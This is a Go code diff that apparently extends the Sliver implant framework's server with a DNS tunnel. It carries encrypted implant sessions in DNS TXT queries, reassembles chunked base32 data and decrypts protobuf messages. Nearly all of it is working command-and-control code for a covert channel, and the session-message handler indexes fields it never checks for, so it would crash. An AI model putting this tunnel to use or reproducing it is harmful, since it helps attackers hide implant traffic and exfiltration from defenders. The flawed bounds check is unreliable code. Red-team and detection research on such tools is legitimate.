@@ -1,20 +1,31 @@
 package main
 
+/*
+
+DNS Tunnel Implementation
+
+
+*/
+
 import (
 	"bytes"
 	"crypto/x509"
+	"encoding/base32"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/pem"
+	"errors"
 	"fmt"
 	"log"
 	insecureRand "math/rand"
+	pb "sliver/protobuf"
 	"sliver/server/cryptography"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
+	"github.com/golang/protobuf/proto"
 	"github.com/miekg/dns"
 )
 
@@ -45,6 +56,9 @@ var (
 
 	dnsSessionsMutex = &sync.RWMutex{}
 	dnsSessions      = &map[string]*DNSSession{}
+
+	blockReassemblerMutex = &sync.RWMutex{}
+	blockReassembler      = &map[string][][]byte{}
 )
 
 // SendBlock - Data is encoded and split into `Blocks`
@@ -55,10 +69,14 @@ type SendBlock struct {
 
 // DNSSession - Holds DNS session information
 type DNSSession struct {
+	ID          string
 	SliverName  string
+	Sliver      *Sliver
 	Key         cryptography.AESKey
-	LastCheckin time.Duration
+	LastCheckin time.Time
 }
+
+// --------------------------- DNS SERVER ---------------------------
 
 func startDNSListener(domain string) *dns.Server {
 
@@ -100,15 +118,13 @@ func handleDNSRequest(domain string, writer dns.ResponseWriter, req *dns.Msg) {
 }
 
 func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
+
 	q := req.Question[0]
-
 	fields := strings.Split(subdomain, ".")
-	log.Printf("fields = %v", fields)
-
 	resp := new(dns.Msg)
 	resp.SetReply(req)
 	msgType := fields[len(fields)-1]
-	log.Printf("msgType = %s", msgType)
+
 	switch msgType {
 	case domainKeyMsg: // Send PubKey -  _(nonce).(slivername)._domainkey.example.com
 		blockID, size := getDomainKeyFor(domain)
@@ -124,7 +140,7 @@ func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
 			blockID := fields[3]
 			txt := &dns.TXT{
 				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
-				Txt: getSendBlocks(blockID, startIndex, stopIndex),
+				Txt: dnsSendBlocks(blockID, startIndex, stopIndex),
 			}
 			resp.Answer = append(resp.Answer, txt)
 		} else {
@@ -141,10 +157,37 @@ func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
 			}
 			resp.Answer = append(resp.Answer, txt)
 		}
-	case sessionHeaderMsg: // Session Header: _(nonce).(pb.DNSBlock).(session id)._sh.example.com
-
-	case sessionMsg: //Session data: _(nonce).(seq|encoded data).(seq|encoded data).s.example.com
-
+	case sessionHeaderMsg: // Session Header: _(nonce).(pb.DNSBlockHeader).(session id)._sh.example.com
+		if len(fields) == 3 {
+			encodedDNSBlock := fields[1]
+			sessionID := fields[2]
+			err := dnsSessionHeader(encodedDNSBlock, sessionID)
+			result := 0
+			if err != nil {
+				result = 1
+			}
+			txt := &dns.TXT{
+				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
+				Txt: []string{fmt.Sprintf("%d", result)},
+			}
+			resp.Answer = append(resp.Answer, txt)
+		}
+	case sessionMsg: //Session data: _(nonce).(seq|encoded data).(blockHeaderID).(session id).s.example.com
+		if len(fields) == 2 {
+			data1 := fields[1]
+			headerID := fields[2]
+			sessionID := fields[3]
+			err := dnsSessionMessage([]string{data1}, headerID, sessionID)
+			result := 0
+			if err != nil {
+				result = 1
+			}
+			txt := &dns.TXT{
+				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
+				Txt: []string{fmt.Sprintf("%d", result)},
+			}
+			resp.Answer = append(resp.Answer, txt)
+		}
 	case clearBlockMsg: // Clear block: _(nonce).(block id)._cb.example.com
 		if len(fields) == 3 {
 			result := 0
@@ -166,6 +209,14 @@ func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
 	return resp
 }
 
+// --------------------------- DNS SESSION START ---------------------------
+func getDomainKeyFor(domain string) (string, int) {
+	certPEM, _, _ := GetServerRSACertificatePEM("slivers-rsa", domain)
+	blockID, blockSize := storeSendBlocks(certPEM)
+	log.Printf("Encoded cert into %d blocks with ID = %s", blockSize, blockID)
+	return blockID, blockSize
+}
+
 func startDNSSession(domain string, encryptedSessionKey string, sliverName string) (string, error) {
 	_, privateKeyPEM, err := GetServerRSACertificatePEM("slivers-rsa", domain)
 	if err != nil {
@@ -179,21 +230,121 @@ func startDNSSession(domain string, encryptedSessionKey string, sliverName strin
 		log.Printf("Failed to decrypt RSA message %v", err)
 		return "", err
 	}
-	sessionID := dnsSessionID()
 	aesSessionKey, _ := cryptography.AESKeyFromBytes(sessionKey)
+
+	sliver := &Sliver{
+		ID:        getHiveID(),
+		Send:      make(chan pb.Envelope),
+		RespMutex: &sync.RWMutex{},
+		Resp:      map[string]chan *pb.Envelope{},
+	}
+
+	sessionID := dnsSessionID()
+	dnsSessionsMutex.Lock()
+	(*dnsSessions)[sessionID] = &DNSSession{
+		ID:          sessionID,
+		SliverName:  sliverName,
+		Sliver:      sliver,
+		Key:         aesSessionKey,
+		LastCheckin: time.Now(),
+	}
+	dnsSessionsMutex.Unlock()
+
 	encryptedSessionID, _ := cryptography.GCMEncrypt(aesSessionKey, []byte(sessionID))
 	encodedSessionID := base64.RawStdEncoding.EncodeToString(encryptedSessionID)
 	return encodedSessionID, nil
 }
 
-func getDomainKeyFor(domain string) (string, int) {
-	certPEM, _, _ := GetServerRSACertificatePEM("slivers-rsa", domain)
-	blockID, blockSize := storeSendBlocks(certPEM)
-	log.Printf("Encoded cert into %d blocks with ID = %s", blockSize, blockID)
-	return blockID, blockSize
+// --------------------------- DNS SESSION RECV ---------------------------
+
+func dnsSessionHeader(dnsBlockHeaderData string, sessionID string) error {
+	dnsSessionsMutex.Lock()
+	defer dnsSessionsMutex.Unlock()
+	if dnsSession, ok := (*dnsSessions)[sessionID]; ok {
+		headerData, err := sessionDecrypt(dnsSession.Key, dnsBlockHeaderData)
+		if err != nil {
+			log.Printf("Failed to decrypt session message header %v", err)
+			return err
+		}
+		dnsBlockHeader := &pb.DNSBlockHeader{}
+		err = proto.Unmarshal(headerData, dnsBlockHeader)
+		if err != nil {
+			log.Printf("Failed to decode DNSBlockHeader %v", err)
+			return err
+		}
+		blockReassemblerMutex.Lock()
+		(*blockReassembler)[dnsBlockHeader.Id] = make([][]byte, dnsBlockHeader.Size)
+		blockReassemblerMutex.Unlock()
+	}
+	return nil
 }
 
-func getSendBlocks(blockID string, startIndex string, stopIndex string) []string {
+// Process an incoming DNS Session message
+func dnsSessionMessage(encryptedData []string, encryptedHeaderID string, sessionID string) error {
+	dnsSessionsMutex.Lock()
+	dnsSession, ok := (*dnsSessions)[sessionID]
+	dnsSessionsMutex.Unlock()
+	if !ok {
+		return errors.New("Invalid sesion ID")
+	}
+	headerID, err := sessionDecrypt(dnsSession.Key, encryptedHeaderID)
+	if err != nil {
+		return err
+	}
+
+	blockReassemblerMutex.Lock()
+	defer blockReassemblerMutex.Unlock() // Lock until we return incase of duplicate messages
+	reasm, ok := (*blockReassembler)[string(headerID)]
+	if !ok {
+		return errors.New("Invalid block header ID")
+	}
+	for _, ciphertext := range encryptedData {
+		rawBuf, err := base32.StdEncoding.DecodeString(ciphertext)
+		if err != nil {
+			return err
+		}
+		seqBuf := make([]byte, 4)
+		copy(seqBuf, rawBuf[:4])
+		seq := int(binary.LittleEndian.Uint32(seqBuf))
+		if seq < 0 || len(reasm) <= seq {
+			return errors.New("Invalid sequence number")
+		}
+		reasm[seq] = rawBuf[4:]
+	}
+	encryptedEnvelopeData := []byte{}
+	for index := 0; index < len(reasm); index++ {
+		if reasm[index] == nil {
+			return nil // Message is incomplete
+		}
+		encryptedEnvelopeData = append(encryptedEnvelopeData, reasm[index]...)
+	}
+	envelopeData, err := cryptography.GCMDecrypt(dnsSession.Key, encryptedEnvelopeData)
+	if err != nil {
+		return err
+	}
+	envelope := &pb.Envelope{}
+	err = proto.Unmarshal(envelopeData, envelope)
+	if err != nil {
+		log.Printf("Failed to decode Envelope %v", err)
+		return err
+	}
+
+	if envelope.Id != "" {
+		dnsSession.Sliver.RespMutex.Lock()
+		if resp, ok := dnsSession.Sliver.Resp[envelope.Id]; ok {
+			resp <- envelope
+			delete(*blockReassembler, string(headerID)) // We still have the reasm lock
+		}
+		dnsSession.Sliver.RespMutex.Unlock()
+	}
+
+	return nil
+}
+
+// --------------------------- DNS SESSION SEND ---------------------------
+
+// Send blocks of data via DNS TXT responses
+func dnsSendBlocks(blockID string, startIndex string, stopIndex string) []string {
 	start, err := strconv.Atoi(startIndex)
 	if err != nil {
 		return []string{}
@@ -225,6 +376,7 @@ func getSendBlocks(blockID string, startIndex string, stopIndex string) []string
 	return []string{}
 }
 
+// Clear send blocks of data from memory
 func clearSendBlock(blockID string) bool {
 	sendBlocksMutex.Lock()
 	defer sendBlocksMutex.Unlock()
@@ -235,6 +387,7 @@ func clearSendBlock(blockID string) bool {
 	return false
 }
 
+// Stores encoded blocks fo data into "sendBlocks"
 func storeSendBlocks(data []byte) (string, int) {
 	blockID := generateBlockID()
 
@@ -263,6 +416,9 @@ func storeSendBlocks(data []byte) (string, int) {
 	return sendBlock.ID, len(sendBlock.Data)
 }
 
+// --------------------------- HELPERS ---------------------------
+
+// Unique IDs, no need for secure random
 func generateBlockID() string {
 	insecureRand.Seed(time.Now().UnixNano())
 	blockID := []rune{}
@@ -283,4 +439,13 @@ func dnsSessionID() string {
 		sessionID = append(sessionID, dnsCharSet[index])
 	}
 	return "_" + string(sessionID)
+}
+
+// Wrapper around GCMEncrypt & Base32 encode
+func sessionDecrypt(sessionKey cryptography.AESKey, data string) ([]byte, error) {
+	encryptedData, err := base32.StdEncoding.DecodeString(data)
+	if err != nil {
+		return nil, err
+	}
+	return cryptography.GCMDecrypt(sessionKey, encryptedData)
 }
